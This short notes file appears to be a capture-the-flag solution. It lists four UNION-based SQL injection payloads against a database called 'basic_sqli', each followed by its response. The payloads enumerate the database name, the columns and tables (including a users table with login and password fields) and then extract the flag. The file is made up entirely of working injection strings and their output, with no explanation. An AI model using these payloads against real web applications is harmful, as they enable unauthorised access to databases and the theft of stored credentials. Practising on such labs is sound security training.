' or 1=2 UNION SELECT 1, DATABASE(), 3 #
# Response: basic_sqli

' or 1=2 UNION SELECT 1, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=basic_sqli), 3 #
# Response: id,flag,id,login,password

' or 1=2 UNION SELECT 1, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='basic_sqli'), 3 #
# Response: flag, users

' or 1=2 UNION SELECT 1, (SELECT flag from flag), 3 #
# Response: flag